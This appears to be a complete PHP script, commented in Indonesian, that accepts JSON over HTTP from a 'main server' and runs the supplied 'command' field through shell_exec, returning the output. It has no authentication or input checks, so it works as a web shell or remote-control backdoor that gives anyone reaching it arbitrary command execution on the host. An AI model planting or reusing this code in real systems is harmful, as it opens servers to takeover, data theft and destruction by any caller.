<?php
// Terima data JSON dari server utama
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['command'])) {
    $command = $data['command'];

    // Eksekusi perintah menggunakan shell_exec
    $output = shell_exec($command);

    // Jika perintah tidak menghasilkan output, beri pesan default
    if (empty($output)) {
        $output = "Command executed, but no output returned.";
    }

    // Kirim respons kembali ke server utama
    echo json_encode(['status' => 'success', 'output' => $output]);
} else {
    // Jika tidak ada perintah yang diterima
    echo json_encode(['status' => 'error', 'message' => 'No command received']);
}
?>
